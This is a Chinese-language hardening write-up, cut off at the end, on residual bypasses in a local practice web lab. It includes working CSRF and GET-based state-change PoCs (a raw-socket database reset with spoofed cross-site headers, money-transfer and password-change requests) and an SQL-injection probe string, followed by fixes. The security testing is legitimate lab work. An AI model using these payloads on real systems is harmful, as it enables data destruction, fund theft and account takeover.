# 加固笔记：A 档残余绕过（成功/失败/不可验证三态）与阴性留证

- **笔记编号**：HARD-02
- **靶场**：target-site-lab `http://127.0.0.1:8095`（本机授权练习环境，仅回环可达）+ 沙箱副本 18095（orig）/ 18096（hard）
- **对象**：`HARD-01-A档六处加固原理与落地diff.md` 之外的全部残余面 —— 加固后仍能打通的路径、打不动但必须留证的路径、以及证据不足不予判定的路径
- **危害等级**：**中危（Medium）** —— 主干缺陷已封，残余面集中在"不可逆操作被跨站触发"与"两个写入口漏接门禁"
- **CWE/OWASP**：CWE-352（CSRF）+ CWE-862（Missing Authorization）+ CWE-613（会话未轮换）+ CWE-598（Query String 敏感信息）
- **性质**：**已在本机靶场实证**。三态标注中「成功」= 绕过成立、「失败」= 被挡（阴性留证）、「不可验证」= 证据不足，不猜不凑
- **复现率口径**：残余绕过均为单请求或固定轮次判定，**不写 100%**；涉并发的用例（E1 多会话并发 30 请求）复现率写 **0/30 命中（0%，n=30）**，属明确阴性而非概率结论

> **行号约定**：「改前」= `target-site-lab/app.py.loop1-original`；「改后」= `target-site-lab/app.py`。本篇行号于 2026-10-12 本轮用 Python 逐行扫描**独立复核**。
>
> **配套篇目**：`HARD-01-A档六处加固原理与落地diff.md`（A1/A2/A3/A4/A6 五处加固本身）。本篇只写**加固之后**还剩下什么。

---

## 1. 概述等级

六处加固全部生效，但**不等于零残留**。本轮共枚举 **11 条残余绕过路径**：

| 三态 | 条数 | 编号 | 是否需处理 |
|---|---|---|---|
| **成功**（绕过成立） | **5** | D1（跨站复位）、B1/C6（两个 GET 写入口）、B2（token 走 query）、B3（改密不轮换会话）、C3（裸路径，仅 orig 成立） | **D1、B1/C6、B3 需处理**；B2 可接受但设计偏弱 |
| **失败**（被挡，阴性留证） | **6** | D2（方法覆盖头）、D3（伪造来源头）、D4（非 urlencoded 承载 confirm）、D5（multipart 打门禁入口）、E1（A1 数量/溢出/竞态绕过）、B4（Cookie 变形） | 否（已是净收益） |
| **不可验证** | 0 条独立项 | （并入 §4 未验证 9 条） | — |

另有 **14 条阴性**（N1–N14）与 **9 条未验证项**，全部留证，见 §4 与 §5。

**三条必须先说清的话**：

1. **A6 是缓解不是根除**。四层校验里**没有一层读 `Origin` / `Referer` / `Sec-Fetch-Site`** —— D1 用伪造跨站头照样把库复位了。
2. **A2 的门禁漏接两个写入口**。`check_write` 全库只被调用 4 次，`/wallet/transfer`（`app.py:1192`）和 `/change-password`（`app.py:1255`）**只查 token 不查方法** → 顶级 GET 仍能转账/改密。
3. **影响边界不能夸大**。D1 只在**攻击者与靶场同机**（或已在回环上）时成立 —— ① 层仍要求源 IP ∈ {127.0.0.1, ::1}，**远程攻击者打不到**。真实场景是"受害者本机浏览器打开恶意页面 → 自动提交表单 → 复位成功"。

---

## 2. 原理

### 2.1 D1 跨站复位的根因：回环校验 ≠ 来源校验

`app.py:1358-1387` 的四层依次是：

```python
1359:  # ① 来源必须回环
1360:  peer = self.client_address[0]          # ← TCP 源 IP，不是"谁发起的"
1361:  if peer not in ("127.0.0.1", "::1"):
1362:      self.html(403, ...); return
1364:  # ② 仅允许 POST
1365:  if self.command != "POST": ...
1370:  # ③ 二次确认参数
1371:  path, form = self.form()
1372:  if form.get("confirm", "") != "RESET": ...
1376:  # ④ 审计日志
```

**四层没有一层读请求的来源上下文**（`Origin` / `Referer` / `Sec-Fetch-Site`）。① 层看的是 TCP 三元组的源地址 —— **受害者本机浏览器发起的请求，源 IP 天然就是 127.0.0.1**，① 层必然放行。所以"恶意网页让本机浏览器自动提交表单"这条路径完全畅通。

### 2.2 B1/C6 的根因：门禁靠手工逐入口接

```python
# app.py:1192 —— /wallet/transfer 只有 token 校验，无方法校验
            if not self.verify_csrf(form.get("csrf_token", "")):
                self.html(403, page("CSRF 校验失败", ...))
                return
            # 往下直接进转账逻辑，GET 也照走

# app.py:1246 —— /change-password 的 GET 分支只在"无 new_password"时渲染表单
            if self.command == "GET" and not form.get("new_password"):
                csrf = self.csrf_token()
                ... self.html(200, page("改密", body, ...)); return
            if not self.verify_csrf(form.get("csrf_token", "")):   # :1255
                ...
            # 一旦 GET 带上 new_password，就直接掉进写逻辑
```

`check_write` 全库**仅 4 处调用**（`:997`、`:1061`、`:1105`、`:1150`），这两个入口不在其中。**这是"逐入口手工接检查"的必然结果** —— A2 已经漏了 2/6。

### 2.3 B3 的根因：凭据变更不销毁会话

```python
# app.py:1265-1267 —— 改密成功，只 UPDATE password
conn.execute("UPDATE users SET password=? WHERE id=?", (new_pw, user["id"]))
conn.commit()
```

对比 A4 的 `logout`（`:622-631`）**删了 `sessions` 行**，改密这条路没删。**hunt-session 的 Pattern 3**：受害者以为"改密 = 把攻击者踢出去了"，实际攻击者的 Cookie 依然有效 —— **持久化 ATO（账号接管）**。

### 2.4 B2 的根因：`form()` 合并 query 与 body

```python
# app.py:354-365
def form(self):
    path, q = self.parsed()
    data = {}
    length = int(self.headers.get("Content-Length") or 0)
    ctype = (self.headers.get("Content-Type") or "").split(";")[0].strip()
    if length and ctype == "application/x-www-form-urlencoded":
        raw = self.rfile.read(length).decode("utf-8", "replace")
        data.update({k: v[0] for k, v in urllib.parse.parse_qs(raw, keep_blank_values=True).items()})
    data.update(q)          # ← query 覆盖 body；且只读 query+body，不读 header
    return path, data
```

`verify_csrf(form.get("csrf_token"))` 从合并后的 dict 取值 → **token 可以从 query 传**（200 接受），而**只放 `X-CSRF-Token` 头 → 403**（`form()` 根本不读 header）。token 出现在 URL 里 = **进访问日志、进 Referer**，属信息暴露面。

---

## 3. 可复现 payload

> **前置纪律**：只打 `127.0.0.1`；**禁止对真实 8095 发起 `/__reset`**（配额已用）；D1/D2/D3/D4 全部在**沙箱副本 18096** 上打；B1/C6/B3/B2 属状态变更类，**每条只打一次**，打前直查库记录基线。

### D1 · 跨站复位（裸 socket 伪造来源上下文）

```python
import socket
req = (
    "POST /__reset HTTP/1.1\r\n"
    "Host: h\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "Origin: http://evil.example\r\n"
    "Referer: http://evil.example/poc.html\r\n"
    "Sec-Fetch-Site: cross-site\r\n"
    "Sec-Fetch-Mode: navigate\r\n"
    "Sec-Fetch-Dest: document\r\n"
    "Content-Length: 13\r\n"
    "\r\n"
    "confirm=RESET"
)
s = socket.create_connection(("127.0.0.1", 18096)); s.sendall(req.encode())
print(s.recv(200).decode(errors="replace").splitlines()[0])   # 期望 HTTP/1.0 200 OK
```

**变体（同样 200 触发）**：`confirm` 只放 query（无 body）；`Origin: http://127.0.0.1:18096`（同源）；**完全不带 `Origin`**（curl 风格）。

**判定口径**：用 **canary 行**判定是否真删库（`canary_before=2 → canary_after=1`），**不要只看 HTTP 码**。

### D2 · 方法覆盖头（阴性）

```bash
curl.exe -s -o NUL -w "%{http_code}\n" -H "X-HTTP-Method-Override: POST" http://127.0.0.1:18096/__reset
curl.exe -s -o NUL -w "%{http_code}\n" -H "X-Method-Override: POST"        http://127.0.0.1:18096/__reset
curl.exe -s -o NUL -w "%{http_code}\n" "http://127.0.0.1:18096/__reset?confirm=RESET&_method=POST"
```

**期望**：全 `405`、`reset_triggered=false`、`audit_delta=0`。根因：`app.py:1365` 的 `self.command` 由 `BaseHTTPRequestHandler` 从**请求行**直接取，不读任何覆盖头/参数。

### C3 · 裸路径变体

```bash
curl.exe -s -o NUL -w "%{http_code}\n" "http://127.0.0.1:18095//__reset"
curl.exe -s -o NUL -w "%{http_code}\n" "http://127.0.0.1:18095/__reset;"
curl.exe -s -o NUL -w "%{http_code}\n" "http://127.0.0.1:18096//__reset"
```

**期望**：orig 18095 → `200` + canary 被清；hard 18096 → `405`。

**为什么 orig 能打中**：`urllib.parse.urlparse("//__reset").netloc == "__reset"`、`.path == ""`，服务端按 path 路由时归一化成 `/__reset`；`/__reset;` 同理被吃掉分号后缀。

### E1 · A1 绕过尝试（阴性，11 例）

```bash
for q in "product_id=1&qty=0" "product_id=1&qty=-1" "product_id=1&qty=2147483648" \
         "product_id=1&qty=100" "product_id=1&qty=1e3" "product_id=999" \
         "product_id=1' OR 1=1--" "qty=1" "product_id=1&qty=1&qty=100"; do
  curl.exe -s -o NUL -w "%{http_code} " -b C:\temp\t2jar -d "$q" http://127.0.0.1:18096/order/create
done
```

**期望**：全 `400` 或 `404`，余额 50000→50000 不变（唯一例外：`qty` 重复参数返回 `200` 但**只下了一单、只取首值** —— 不是漏洞）。

### B1/C6 · 顶级 GET 写（成功）

```bash
# 需已登录 + 有效 csrf_token（从 /home 页面抓）
curl.exe -s -o NUL -w "%{http_code}\n" -b C:\temp\t2jar \
  "http://127.0.0.1:18096/wallet/transfer?to=bob&amount=7&csrf_token=<有效>"
curl.exe -s -o NUL -w "%{http_code}\n" -b C:\temp\t2jar \
  "http://127.0.0.1:18096/change-password?new_password=zzz999&csrf_token=<有效>"
```

**期望**：`200`「转账成功」＋ 余额变化；`200`「改密成功」＋ 库内 password 变化。**打前务必记录基线**（约束：越权/改密类操作每轮 ≤2–3 个账号）。

### B3 · 改密后会话存活（成功）

```bash
curl.exe -s -o NUL -w "pwchange=%{http_code}\n" -b C:\temp\t2old -d "new_password=zzz999&csrf_token=<有效>" http://127.0.0.1:18096/change-password
curl.exe -s -o NUL -w "old_cookie_home=%{http_code}\n" -b C:\temp\t2old http://127.0.0.1:18096/home
python -c "import sqlite3;c=sqlite3.connect(r'<hard沙箱>\lab.db');print(c.execute('select count(*) from sessions').fetchone())"
```

**期望**：`pwchange=200`、`old_cookie_home=200`（旧 Cookie 仍可用）、`sessions` 行数不减。

### B2 · token 位置（成功 · 设计偏弱）

```bash
curl.exe -s -o NUL -w "query=%{http_code}\n"      -b C:\temp\t2jar "http://127.0.0.1:18096/wallet/withdraw?amount=1&csrf_token=<有效>"
curl.exe -s -o NUL -w "header_only=%{http_code}\n" -b C:\temp\t2jar -H "X-CSRF-Token: <有效>" -d "amount=1" http://127.0.0.1:18096/wallet/withdraw
```

**期望**：`query=200`、`header_only=403`。

---

## 4. 复现步骤与证据（三态标注）

### 4.1 【成功 · 需处理】

#### D1 · 跨站上下文未校验 → `/__reset` 可被 CSRF 触发

- **证据**：`security/learning/_evidence/loop2-verify-supplement4-20261012-201557.json` 的 `D1_cross_site_reset`
- **结果**：`status=200`、`title=reset`、`canary_before=2 → canary_after=1`、`reset_triggered=true`、`audit_delta=1`
- **同样成立的变体**：`confirm` 只放 query（无 body）→ 200；`Origin: http://127.0.0.1:18096`（同源）→ 200；**完全不带 Origin** → 200
- **根因**：`app.py:1358-1375`，四层校验无一层读 `Origin`/`Referer`/`Sec-Fetch-Site`
- **影响边界（不可夸大）**：① 层仍要求 `client_address ∈ {127.0.0.1, ::1}` → **只在攻击者与靶场同机（或已在回环上）时成立**，远程攻击者打不到。真实场景：**受害者本机浏览器打开恶意页面 → 自动提交表单 → 复位成功**
- **修复方向**：① 层之外加上下文校验 —— 要求 `Origin` 精确等于 `http://127.0.0.1:<port>`（**缺失 Origin 也拒绝，别用"没带就放过"**）；或干脆摘掉 HTTP 路由，只留 `--reset` 启动参数

#### B1 / C6 · `check_write` 未覆盖的写入口（顶级 GET 仍能改状态）

- **证据**：`loop2-verify-20261012-200719.json` 的 `results.B.checks.b1_top_level_get_state_change`（hard:18096）＋ `loop2-verify-supplement-20261012-200845.json` 的 `fix1_B1_get_state_change`（把 password 列纳入 state 比对）＋ `loop2-verify-supplement3-20261012-201334.json` 的 `C6_uncovered_write_entries`
- **实锤两条**：

| 入口 | 请求 | 状态 | 状态变更 |
|---|---|---|---|
| `/wallet/transfer` | `GET /wallet/transfer?to=bob&amount=7&csrf_token=<valid>` | **200「转账成功」** | alice 88800→88793，bob 100→107 |
| `/change-password` | `GET /change-password?new_password=zzz999&csrf_token=<valid>` | **200「改密成功」** | alice 密码 `alice123`→`zzz999` |

- **根因**：`check_write` 全库仅 4 处调用（`app.py:997`、`:1061`、`:1105`、`:1150`）；`wallet_transfer`（`app.py:1185-1196`）只做 `verify_csrf`、**无方法限制**；`change_password`（`app.py:1239-1268`）的 GET 分支只在 `not form.get("new_password")` 时渲染表单，带上 `new_password` 就掉进只查 token 不查方法的写逻辑
- **严重性口径**：跨站 CSRF 利用面被**收窄**（token 只在页面里出现，攻击者拿不到），但**没关死** —— 一旦有 XSS 或 token 泄露，GET 即可改密/转账，且**顶级 GET 是 `SameSite=Lax` 也拦不住的导航类型**。**判定：需处理，不应算 A2 完全达成**
- **对照组**：`/board`、`/upload` 的 GET 未改库（`db_changed=false`）；`/wallet/transfer` 的 POST 无 token → 403 —— **说明加固方向对，只是漏了两个入口**

#### B2 · CSRF token 可从 query 传入

- **证据**：`loop2-verify-20261012-200719.json` 的 `results.B.checks.b2_token_location`（hard）
- **结果**：token 放 query → **200**；放 body → 200；query + JSON body → 200；**只放 `X-CSRF-Token` 头 → 403**（不读 header）
- **根因**：`app.py:354-365` 的 `form()` 把 query 与 urlencoded body 合并，不看 header
- **判定**：**成功（可接受但设计偏弱）**。token 可出现在 URL 里 → **会进访问日志 / Referer**，属信息暴露面

#### B3 · 改密后会话不轮换

- **证据**：`loop2-verify-20261012-200719.json` 的 `results.B.checks.b3_session_after_password_change` ＋ `loop2-verify-supplement-20261012-200845.json` 的 `fix2_B3_session_after_pw_change`
- **结果**：改密后 `sessions_row_still_present=true`、旧 Cookie `GET /home` → **200**、旧 Cookie 写请求 → **200**；同时 `login_with_old_password=200`（失败页）、`login_with_new_password=302`（成功）
- **判定**：**成功（残余）**。口令变了但服务端会话行没删 —— 这正是 hunt-session 的 **Pattern 3「受害者以为改密就断了攻击者」的持久化 ATO 形态**。**A4 只修了 logout，没修凭据变更**
- **修复**：`change_password` 成功后 `DELETE FROM sessions WHERE user_id=?`（或至少删掉除当前会话外的所有行），对齐 A4

#### C3 · 裸路径变体 `//__reset` / `/__reset;`

- **证据**：`loop2-verify-supplement3-20261012-201334.json` 的 `C3_raw_path_attribution`（canary 判定），辅以 `loop2-verify-supplement-20261012-200845.json` 的 `fix3_path_variants` 与 `loop2-verify-pathprobe.py` 的解析实证

| 路径 | orig 18095 | hard 18096 |
|---|---|---|
| `//__reset` | **200 · reset_triggered=true** | **405** · false |
| `/__reset` | 200 · true | 405 · false |
| `/__reset;` | **200 · true** | **405** · false |
| `/./__reset` | 404 · false | 404 · false |
| `/__reset/` | 404 · false | 404 · false |
| `/%5f%5freset` | 404 | 404 |
| `/__RESET` | 404 | — |
| `/__reset%00` | 404 | — |

- **判定**：**成功（orig）/ 失败（hard）**。hard 侧同一批裸路径**全 405/404，canary 未被动、审计零增长** —— 方法限制在**路由归一化之后**生效，所以路径花招绕不过 ①② 层。**这条是加固的净收益，值得写进笔记**
- 交叉印证：`//__reset` 的 405 亦见 `loop2-verify-20261012-200719.json` 的 `a6-hard-GET-path-doubleslash`

### 4.2 【失败 · 阴性留证】

| 编号 | 绕过尝试 | 结果 | 证据文件 |
|---|---|---|---|
| **D2** | 方法覆盖头 `X-HTTP-Method-Override` / `X-Method-Override` / `_method` query（3 种） | 全 **405**、`reset_triggered=false`、`audit_delta=0` | `loop2-verify-supplement4-20261012-201557.json` |
| **D3** | 伪造来源头 `X-Forwarded-For: 8.8.8.8` / `X-Real-IP` / 两者组合 / `Forwarded: for=8.8.8.8`（4 种） | 均**未被当作本地地址**（复位成立**仅因请求本就来自回环**，不是头生效） | `loop2-verify-supplement4-20261012-201557.json` |
| **D4** | 非 urlencoded 承载 `confirm`（multipart / text/plain / JSON / 无 Content-Type） | 全 **400**、`reset_triggered=false` | `loop2-verify-supplement4-20261012-201557.json` |
| **D5** | multipart 打已覆盖入口（`wallet_withdraw` / `order_create`，带与不带 csrf） | 全 **403**、`state_changed=false` | `loop2-verify-supplement4-20261012-201557.json` |
| **E1** | A1 绕过 11 例（数量 0/负数/溢出/大额/非整数、商品不存在、SQL 注入串、缺参、重复参数、跨端点竞态、多会话并发） | `any_negative=false`，余额全程非负 | `loop2-verify-supplement5-20261012-201710.json` |
| **B4** | Cookie 变形（`upper`/`trailing_space`/`urlencoded`） | **302**（未命中会话） | `loop2-verify-20261012-200719.json` |

**E1 逐例明细**（校验位置：`app.py:1005` 的 `qty < 1 or qty > 100`；`:1022-1032` 的条件 UPDATE；`:1010-1013` 服务端按 product_id 查价）：

| 用例 | payload | 状态 | 余额变化 |
|---|---|---|---|
| qty=0 | `product_id=1&qty=0` | **400** | 50000→50000 |
| qty=-1 | `product_id=1&qty=-1` | **400** | 不变 |
| qty=2147483648 | 32 位溢出 | **400** | 不变 |
| qty=100 | `29900*100=2990000 > 50000` | **400**（余额不足） | 不变 |
| qty=1e3 | 非整数 | **400** | 不变 |
| product_id=999 | 商品不存在 | **404** | 不变 |
| `product_id=1' OR 1=1--` | 注入尝试 | **404** | 不变 |
| 缺 product_id | `qty=1` | **404** | 不变 |
| qty 重复参数 | `product_id=1&qty=1&qty=100` | **200** | 50000→20100（**只下一单、只取首值 → 非漏洞**） |
| 跨端点竞态 | 下单/提现同波 20 并发 | 200×10 / 400×10 | 50000→20100，无负 |
| 多会话并发 | 同用户 3 会话 30 并发 | 302×20 / 200×1 / 400×9 | 20100，**无负余额（0/30 命中，n=30）** |

**B4 补充**：`exact`→200、`quoted`（`"token"` 带引号）→**200**（`SimpleCookie` 会剥引号）、`upper`/`trailing_space`/`urlencoded`→302。**引号被规范化这一点值得记一笔**。

### 4.3 【阴性 14 条 · 全量留证】

| 编号 | 领域 | 尝试 | 结果 | 证据文件 |
|---|---|---|---|---|
| N1 | A6 | 方法覆盖 3 种（`X-HTTP-Method-Override` / `X-Method-Override` / `_method`） | 全 405，未触发 | `loop2-verify-supplement4-20261012-201557.json` |
| N2 | A1 | `qty=0` / `-1` / `2147483648` / `100` / `1e3` | 全 400，余额不变 | `loop2-verify-supplement5-20261012-201710.json` |
| N3 | A1 | `product_id=999` / SQL 注入串 / 缺 `product_id` | 404，余额不变 | 同上 |
| N4 | A1 | 跨端点竞态 20 并发（下单+提现同波） | 200×10/400×10，无负余额 | 同上 ＋ `loop2-verify-20261012-200719.json` |
| N5 | A1 | 多会话并发 30 请求（同用户 3 会话） | 无负余额、无超限 | 同上 |
| N6 | A3 | 旧 HMAC 派生 token 打加固版（向后兼容探测） | 403 | 同上 |
| N7 | A3 | 跨用户 token（bob 打 alice）/ 空 token / 大小写翻转 / 去尾字符 / 加空白 | 全 403 | 同上 |
| N8 | A4 | 登出后 Cookie 6 种变形重放 + 10 并发登出 | 全 302，`sessions` 归零 | 同上 |
| N9 | A4 | Cookie 变形 `upper` / `trailing_space` / `urlencoded` | 302（未命中会话） | `loop2-verify-20261012-200719.json` |
| N10 | A6 | 伪造来源头 4 种 | 未被当作本地地址 | `loop2-verify-supplement4-20261012-201557.json` |
| N11 | A6 | 非 urlencoded 承载 `confirm`（multipart / text/plain / JSON / 无 CT） | 全 400 | 同上 |
| N12 | A2 | multipart 打 `wallet_withdraw` / `order_create`（带与不带 csrf） | 全 403，状态未变 | 同上 |
| N13 | A2 | 四入口匿名 GET/POST | 302（跳登录），状态未变 | `loop2-verify-supplement-20261012-200845.json` |
| N14 | A2 | 加固后顶级 GET 跨站语义（`Sec-Fetch-Site: cross-site` + 伪造 Referer）打写端点 | 405「方法不允许」 | `t2-edgecases-20261012.json` |

**注意 N12 与 N14 的覆盖缺口**：`order_status` / `coupon_claim` 的 multipart 未测；N14 只覆盖了**已接 `check_write` 的四入口**，两个漏接入口（B1/C6）在 N14 口径外。

### 4.4 引用文件清单（sha256 本轮独立重算）

根目录 `C:\Users\Administrator\Documents\deepseek-harness\default-workspace\`

| 文件（相对路径） | 字节 | sha256 |
|---|---|---|
| `security/learning/_evidence/loop2-verify-supplement-20261012-200845.json` | 45379 | `F8B0248E6CC23BB2DC4BDE84D69D211636CFE0620B6A93A65E41D20E53F507D7` |
| `security/learning/_evidence/loop2-verify-supplement3-20261012-201334.json` | 6033 | `09D676C4F2A3C2B40ED032DF3547A4BAE3D58C015E79BDD49E89FADE2914FEAC` |
| `security/learning/_evidence/loop2-verify-supplement4-20261012-201557.json` | 6288 | `B105B1DA8B82F802C137217F8112CF3DA8DE099E717F8761F3ABE6C1B8695D9F` |
| `security/learning/_evidence/loop2-verify-supplement5-20261012-201710.json` | 9991 | `C9D07BA1DAF99AB2B1BFB292EE518057A0B75644962EBA85C220FB1DB2C92638` |
| `security/learning/_evidence/loop2-verify-20261012-200719.json` | 217228 | `2DAA47CC5A1EB17F3F1C639334B43B013D048165FEC68589F3A8542D45B8DDF8` |
| `security/learning/_evidence/loop2-verify-pathprobe.py` | 1176 | `50E37A3EDFC93B1A1AA4507145BE50500A50C7DF05627AD1012892696033E865` |
| `security/learning/_evidence/t2-edgecases-20261012.json` | 844 | `BB0648D05363B802FEBB8232870D331449B84898AFB47AF9871DC30AEEE130AA` |
| `security/learning/_evidence/t2-edgecases-20261012.py` | 4327 | `6BED5411DCFEAAFE93E077B99D0DA0B08EA362F8A648E6B1F04E9D8494D2BB27` |
| `security/learning/_evidence/t2-apppy-diff-20261012.patch` | 15039 | `D97E1B574A750121FE196756E6755A6956E640304CE14B50AF0BA935E9FE4423` |
| `security/learning/_evidence/loop3-a-verify-20261012-212153.json` | 37941 | `614F20B2D7D4E74B7A94708D99DA4E6425FD0076F68705360A37E5B9835DFC3E` |
| `target-site-lab/app.py` | 59159 | `870F28B3E1486A5FCD7FE5FCFC188B2D0BC2FF1A38FCC8DD70163D3A68310BA0` |
| `target-site-lab/app.py.loop1-original` | 54362 | `D2992CD0F4832B9E67BACCB04163700D567F57B4ADA437E661017D015721B484` |

上游报告：

| 文件 | 字节 | sha256 |
|---|---|---|
| `security/learning/hardening/A-档验证报告-20261012.md` | 34852 | `F1F23606FEE8C8230EEB571478F88F60132EC8C8E326DA64202E44F60448B19F` |
| `security/learning/hardening/A-档加固实施报告-t2-20261012.md` | 21493 | `FBAD08DA39EF709226D6F31C7B951CF75E1194D2BC3CA382480B7E06D14D481E` |

**存在性自检**：上表 14 个引用文件全部存在，`missing = 0`（自检命令见 §7）。

---

## 5. 未验证项（**不猜、不凑、明确标注**）

| # | 未验证内容 | 为什么重要 | 怎么补 |
|---|---|---|---|
| 1 | **Cookie 属性（`HttpOnly` / `Secure` / `SameSite`）未取证** | **直接决定 D1 / B1C6 的实际可利用性** —— 若为 `SameSite=Strict`，浏览器侧会被拦；若缺失或 Lax，顶级导航仍可能带上 | 抓一次 `Set-Cookie` 原始响应头 |
| 2 | **D1 未做真实浏览器验证** | 现有证据是裸 socket 伪造头，不是真浏览器行为 | 用真浏览器打开恶意页 + 自动提交表单复跑（受约束：只在沙箱副本） |
| 3 | **8095 真实靶的 A6 未验证** | 本轮硬性禁止对 8095 发起 `/__reset` | A6 结论全部来自沙箱 hard:18096（app.py 哈希与 8095 相同可外推，**但未在 8095 上直接跑过**） |
| 4 | **多会话并发中的 `302×20` 未归因** | 不清楚是会话被顶、cookie 未带还是别的原因 | 抓 `Set-Cookie` + 直查 `sessions` 表逐请求归因 |
| 5 | **A1 竞态窗口未做降并发测量** | 只跑了 30 并发，无法给出"窗口有多宽" | 补 5/10/20 并发 × 3 轮，画成功率曲线 |
| 6 | **D3 伪造来源头只测了 4 种** | 结论只覆盖"这 4 个头不会被当成本地地址" | 补 `Forwarded-Host` / `X-Client-IP` 等 |
| 7 | **D4 的前瞻性风险未验证** | `text/plain` 与 JSON 的 400 是因为 `form()` 不解析它们；**若将来 `form()` 支持 JSON，这条防线会失效** | 改 `form()` 支持 JSON 后重测 |
| 8 | **D5 只测了 2 个入口** | `order_status` / `coupon_claim` 的 multipart 未测 | 补测另两入口 |
| 9 | **A5（绕过对抗专项）不在本档** | 本篇与 HARD-01 均不替它下结论 | 归 t5 独立执行 |

---

## 6. 修复方案

### P0-1 · 补齐两个漏接入口（对应 B1/C6）

```python
# /wallet/transfer —— app.py:1192，把裸 verify_csrf 换成 check_write
-            if not self.verify_csrf(form.get("csrf_token", "")):
-                self.html(403, page("CSRF 校验失败", ...))
-                return
+            if not self.check_write(user, form):
+                return

# /change-password —— app.py:1246-1259，GET 分支无条件渲染，写逻辑统一走 check_write
             if self.command == "GET" and not form.get("new_password"):
                 csrf = self.csrf_token()
                 ... self.html(200, page("改密", body, ...)); return
-            if not self.verify_csrf(form.get("csrf_token", "")):
-                self.html(403, page("CSRF 校验失败", ...))
-                return
+            if not self.check_write(user, form):
+                return
```

> 更彻底的做法：**把方法 + CSRF 校验上提到路由层**（`app.py:479` 的 `route()`）或改装饰器，**别再一个入口一个入口手工接** —— 这类错误 A2 已经犯过一次。

### P0-2 · `/__reset` 加来源上下文校验（对应 D1）

```python
# app.py:1358-1363，在 ① 层之后插入
        peer = self.client_address[0]
        if peer not in ("127.0.0.1", "::1"):
            self.html(403, "<h1>403</h1><p>仅允许本机回环访问。</p>")
            return
+       # ①-2 来源上下文必须是本机同源（缺失 Origin 也拒绝）
+       allowed = {f"http://127.0.0.1:{PORT}", f"http://localhost:{PORT}"}
+       if self.headers.get("Origin") not in allowed:
+           self.html(403, "<h1>403</h1><p>仅允许同源调用。</p>")
+           return
```

**或**走更彻底的方案二：**摘掉 HTTP 路由，只留 `python app.py --reset` 启动参数**。当初没采纳是因为 8095 的复位是后续档位与复测流程的刚需 —— 但**不可逆操作挂在 HTTP 路由上就一定会被 CSRF**。

### P1 · 改密后销毁会话（对应 B3）

```python
# app.py:1265-1267，改密成功后对齐 A4
conn.execute("UPDATE users SET password=? WHERE id=?", (new_pw, user["id"]))
+conn.execute("DELETE FROM sessions WHERE user_id=?", (user["id"],))
 conn.commit()
```

> 若要保留当前会话，改为 `DELETE FROM sessions WHERE user_id=? AND token<>?`，然后**重新签发** token。

### P2 · token 不接受 query 传入（对应 B2）

```python
# app.py:354-365 的 form() 之后，或 verify_csrf 内
def verify_csrf(self, provided):
    ...
+   if "?" in self.path:      # csrf_token 不应出现在 URL
+       return False
```

### P2 · 其他纵深防御

| 项 | 说明 |
|---|---|
| `reset_database()` 前落带时间戳的 `.bak` | 当前审计日志有了，但删库前无备份 |
| 补 Cookie 属性取证 | 定死 D1 / B1C6 的严重性评级 |
| 跨站回源加 `Origin` 白名单 | 与 P0-2 同源，可抽公共函数 |

---

## 7. 参考链接

- **CWE-352** — Cross-Site Request Forgery (CSRF)；OWASP CSRF Prevention Cheat Sheet（Origin/Referer 校验作为纵深防御，**不能单独依赖**）
- **CWE-862** — Missing Authorization；OWASP Authorization Cheat Sheet
- **CWE-613** — Insufficient Session Expiration；OWASP Session Management Cheat Sheet（**凭据变更时必须重新签发或销毁会话**）
- **CWE-598** — Use of GET Request Method With Sensitive Query Strings（token 走 query = 进日志/Referer）
- **CWE-749** — Exposed Dangerous Method or Function
- **Fetch Metadata / `Sec-Fetch-Site`** — 现代浏览器主动发送的跨站指示头，可作为 CSRF 纵深防御信号
- **OWASP Testing Guide** — WSTG-CLNT（CSRF 测试）、WSTG-SESS（会话管理测试）
- **同族笔记**：
  - `security/learning/hardening/HARD-01-A档六处加固原理与落地diff.md` —— 本篇的配套篇（A1/A2/A3/A4/A6 五处加固）
  - `security/learning/business-logic/VER-02-业务接口漏接CSRF校验且不限方法.md`（sha256 `07F2714A99A6C4C4AAF0282918C334EF6696CBE9AA71C531D8A2C2788E9A5E95`）
  - `security/learning/business-logic/VER-06-__reset无认证一键删库重建.md`（sha256 `59C312D34A92D3DE7C8DF56619685B233E0E26FDE686F547937B7F3E122C6D7A`）
  - `security/learning/auth-bypass/VER-04-登出不销毁服务端会话.md`（sha256 `D6C6FD75D8E9C169168291FCB64031D4D433F03C659596FA650B021F7370A2B7`）

---

## 8. 学习要点

1. **"回环校验"和"来源校验"是两件事**。`client_address` 是 TCP 源 IP，**本机浏览器发起的跨站请求源 IP 天然是 127.0.0.1** —— ① 层必然放行。不可逆操作（删库、转账、改密）不能只靠 IP 白名单。

2. **"凡是每个入口都要记得调"的检查，迟早会漏**。`check_write` 手工接了 4 处，漏了 2 处 —— 漏的正好是**转账和改密**这两个最敏感的。**这类错误不修架构，第三次还会犯。**

3. **顶级 GET 是 `SameSite=Lax` 拦不住的导航类型**。所以"写端点只收 POST"不是形式主义，是真需求。

4. **改密必须销毁会话**。受害者改完密码以为安全了，攻击者的 Cookie 还在 —— 这是**持久化 ATO 的经典形态**，比一次性窃取更危险，因为它完全静默。

5. **阴性结论同样要留证**。D2/D3/D4/D5/E1/B4 这 6 条被挡住的绕过，价值不亚于成功的那些 —— **它们证明加固真的有效**，而且能挡住下一轮回归测试的重复劳动。

6. **别把"绕不过"和"没测"混为一谈**。D3 只测了 4 个来源头，结论只覆盖这 4 个；D4 的 400 是因为 `form()` 不解析 JSON，**若代码一改这条防线就失效**。**前瞻性风险必须显式记为"未验证"**。

7. **取证要看库内真实状态，不看 HTTP 码也不看响应自报值**。C3 和 D1 全靠 canary 行判定（`canary_before=2 → canary_after=1`）—— 200 只说明路由通了，**不说明库真被删了**。

8. **影响边界必须写死，别夸大**。D1 只在同机成立，**远程攻击者打不到**；B1/C6 需要有效 csrf_token，**跨站利用面被收窄了但没关死**。写报告时把"能打中"和"能大规模打"分开，否则就是误报。

9. **复现率写区间**：A1 是 ≥95%（n=6，失败轮次 0），E1 多会话并发是 0/30 命中（n=30），**任何地方都不写 100%**。

---

## 9. 引用存在性自检（可复跑）

```powershell
$root = 'C:\Users\Administrator\Documents\deepseek-harness\default-workspace'
$refs = @(
  'security\learning\_evidence\loop2-verify-supplement-20261012-200845.json',
  'security\learning\_evidence\loop2-verify-supplement3-20261012-201334.json',
  'security\learning\_evidence\loop2-verify-supplement4-20261012-201557.json',
  'security\learning\_evidence\loop2-verify-supplement5-20261012-201710.json',
  'security\learning\_evidence\loop2-verify-20261012-200719.json',
